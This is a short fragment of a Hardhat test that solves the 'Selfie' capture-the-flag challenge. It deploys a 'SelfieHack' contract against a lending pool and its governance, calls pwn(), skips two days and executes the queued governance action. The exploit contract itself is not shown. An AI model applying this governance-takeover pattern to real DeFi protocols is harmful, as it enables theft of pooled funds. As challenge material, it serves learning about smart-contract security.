...
describe("[Challenge] Selfie", function () {
  ...
  it("Execution", async function () {
    const selfieHack = await ethers.getContractFactory("SelfieHack");
    const selfieHackContract = await selfieHack.deploy(
      pool.address,
      governance.address,
      token.address,
      player.address
    ...
    await selfieHackContract.pwn();
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
    await governance.executeAction(await selfieHackContract.actionId());
  });
